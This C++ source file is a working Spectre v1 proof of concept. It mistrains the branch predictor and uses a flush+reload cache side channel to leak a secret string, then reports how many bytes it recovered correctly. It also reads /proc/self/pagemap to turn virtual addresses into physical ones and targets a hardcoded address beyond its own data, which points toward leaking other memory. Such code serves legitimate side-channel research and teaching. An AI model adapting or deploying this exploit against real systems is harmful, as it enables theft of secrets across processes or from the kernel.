#include <time.h>
#include <stdio.h>
#include <stdint.h>
#include <memory.h>
#include <random>

#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include "utils.hpp"

#define FROM ' '
#define TO 'Z'

const int TRAINING_LOOPS = 1000;
bool IS_ATTACK[TRAINING_LOOPS];
uint8_t arr[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18};
uint8_t hist[256];
uint8_t arr_size = sizeof(arr) / sizeof(uint8_t);
char secret[] = "AD ASTRA ABYSSOSQUE";
char __attribute__((aligned(2048))) mem_side_channel[256 * 2048];

using namespace x86_64;

size_t get_side_channel_info(bool show = true)
{
    if (show)
    {
        printf("  ");
        for (size_t i = FROM; i <= TO; i++)
        {
            printf("%3c ", (char)i);
        }
        printf("\n  ");
    }
    uint8_t max = 0, argmax = FROM, all = 0;
    for (size_t i = FROM; i <= TO; i++)
    {
        if (show)
        {
            printf("%3ld ", i);
        }
        argmax = max > hist[i] ? argmax : i;
        max = max > hist[i] ? max : hist[i];
        all += hist[i];
    }
    if (show)
    {
        printf("\n%% ");
        for (size_t i = FROM; i <= TO; i++)
        {
            printf("%3.0f ", (double)hist[i] / ((double)all + 1e-8) * 100);
        }
        printf("\nargmax: %c\n", argmax);
    }
    return argmax;
}

uint8_t spectre(size_t locate)
{
    // return mem_side_channel[arr[locate] * 2048];
    if (locate < arr_size)
    {
        return mem_side_channel[arr[locate] * 2048];
    }
    return 0;
}

void attack(size_t target)
{
    // initializing the side-channel
    asm_utils::flush(&arr_size);
    for (int i = 0; i < 256; i++)
    {
        asm_utils::flush(&mem_side_channel[i * 2048]);
    }

    // branch mistraining
    for (int i = TRAINING_LOOPS - 1; i >= 0; i--)
    {
        asm_utils::flush(&arr_size);
        spectre(0);
    }

    // spectre attack
    spectre(target);

    // recovering the secret
    for (int i = FROM; i <= TO; i++)
    {
        if (asm_utils::flush_reload((char *)mem_side_channel + 2048 * i))
        {
            hist[i]++;
        }
    }
}

size_t run(size_t locate)
{
    memset(hist, 0, sizeof(hist));
    memset(mem_side_channel, 0, sizeof(mem_side_channel));
    for (size_t i = 0; i < sizeof(mem_side_channel); i++)
    {
        asm_utils::maccess(mem_side_channel + i);
    }
    for (int i = 0; i < 10; i++)
    {
        attack(locate);
    }
    size_t result = get_side_channel_info(false);
    return result;
}

size_t libkdump_virt_to_phys(size_t virtual_address)
{
    static int pagemap = -1;
    if (pagemap == -1)
    {
        pagemap = open("/proc/self/pagemap", O_RDONLY);
        if (pagemap < 0)
        {
            errno = EPERM;
            return 0;
        }
    }
    uint64_t value;
    int got = pread(pagemap, &value, 8, (virtual_address / 0x1000) * 8);
    if (got != 8)
    {
        errno = EPERM;
        return 0;
    }
    uint64_t page_frame_number = value & ((1ULL << 54) - 1);
    if (page_frame_number == 0)
    {
        errno = EPERM;
        return 0;
    }
    return page_frame_number * 0x1000 + virtual_address % 0x1000;
}

int main(int argc, char **argv)
{
    // size_t target_base = (size_t)(&secret) - (size_t)(&arr), len = sizeof(secret) / sizeof(char);

    size_t base_arr = libkdump_virt_to_phys((size_t)(&arr));
    size_t target_base = (size_t)(0x1906de060) - base_arr, len = 20;
    size_t base_target_base = libkdump_virt_to_phys(target_base);
    printf("arr: %p, secret: %p, base_arr: %p, target_base: %p, len: %p\n", &arr, &secret, base_arr, target_base, len);
    printf("base_target_base: %p\n", base_target_base);

    for (int i = 0; i < argc; i++)
    {
        printf("%s \n", argv[i]);
    }

    if (false)
    {
        printf("v: %c %u\n", *secret, *arr);
        printf("a: %ld %ld\n", (size_t)&secret, (size_t)&arr);
        printf("a(size_t): %ld %ld\n", (size_t)&secret, (size_t)&arr);
        printf("diff: %ld\n", target_base);
        printf("%hhu\n", *(char *)((size_t)(&arr) + target_base));
        printf("%ld\n", (size_t)&arr[20]);
        printf("%ld\n", sizeof(uint8_t));
        printf("%ld\n", sizeof(char));
        printf("%c\n", arr[target_base]);
    }
    size_t leak[arr_size + 1], success = 0;
    for (size_t i = 0; i < len - 1; i++)
    {
        size_t result = run(target_base + i);
        leak[i] = result;
        success += secret[i] == (char)result;
    }
    printf("%s, gt\n", secret);
    for (size_t i = 0; i < len - 1; i++)
    {
        printf("%c", (char)leak[i]);
    }
    printf(", success rate: %.3lf%%\n", (double)success / (len - 1) * 100);
    return 0;
}
